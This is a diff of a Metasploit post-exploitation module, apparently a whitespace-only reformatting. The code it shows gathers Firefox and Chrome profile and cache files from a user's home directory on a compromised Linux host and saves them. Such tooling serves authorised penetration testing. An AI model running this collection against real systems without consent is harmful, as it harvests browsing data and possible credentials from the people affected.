@@ -33,10 +33,10 @@ class MetasploitModule < Msf::Post
     output = read_file(filename)
     output
   end
-  
+
   #
   # Collects data from Firefox
-  #	
+  #
   def firefox_history(user, path)
     # Grabbing artifacts from .cache path
     ff_folders = dir(path)
@@ -50,22 +50,22 @@ class MetasploitModule < Msf::Post
           save("Firefox Entry", entry) unless entry.blank? || entry =~ /No entry/
         end
         # Grabbing artifacts from .mozilla path
-	other_artifacts = "/home/#{user}/.mozilla/firefox/#{ff_folders}"
-	ff_other_artifacts = dir(other_artifacts)
-	ff_other_artifacts.each do |ff_other_artifacts|
-	  if file?("/home/#{user}/.mozilla/firefox/#{ff_folders}/#{ff_other_artifacts}")
-	   entry = cat_file("/home/#{user}/.mozilla/firefox/#{ff_folders}/#{ff_other_artifacts}")
-	   save("Firefox Entry", entry) unless entry.blank? || entry =~ /No entry/
-	  end
-	end
-	print_good("Firefox artifacts downloaded")
+        other_artifacts = "/home/#{user}/.mozilla/firefox/#{ff_folders}"
+        ff_other_artifacts = dir(other_artifacts)
+        ff_other_artifacts.each do |ff_other_artifacts|
+          if file?("/home/#{user}/.mozilla/firefox/#{ff_folders}/#{ff_other_artifacts}")
+           entry = cat_file("/home/#{user}/.mozilla/firefox/#{ff_folders}/#{ff_other_artifacts}")
+           save("Firefox Entry", entry) unless entry.blank? || entry =~ /No entry/
+          end
+        end
+        print_good("Firefox artifacts downloaded")
       else
         print_bad("#{ff_folders}/cache2 doesn't exist")
       end
     end
     print_status("")
   end
-  
+
   #
   # Collects data from Google Chrome
   #
@@ -75,8 +75,8 @@ class MetasploitModule < Msf::Post
      print_status("Downloading Chrome artifacts...")
      gc_artifacts.each do |gc_artifacts|
        if file?("/home/#{user}/.cache/google-chrome/Default/Cache/#{gc_artifacts}")
-	 entry = cat_file("/home/#{user}/.cache/google-chrome/Default/Cache/#{gc_artifacts}")
-	 save("Chrome Entry", entry) unless entry.blank? || entry =~ /No entry/
+         entry = cat_file("/home/#{user}/.cache/google-chrome/Default/Cache/#{gc_artifacts}")
+         save("Chrome Entry", entry) unless entry.blank? || entry =~ /No entry/
        end
      end
      # Grabbing artifacts from .config path
@@ -95,7 +95,7 @@ class MetasploitModule < Msf::Post
   #
   def run
     print_status("Finding possible Firefox and Chrome install...")
-    
+
     # Grabs current user
     if datastore['USER']
       user = datastore['USER']
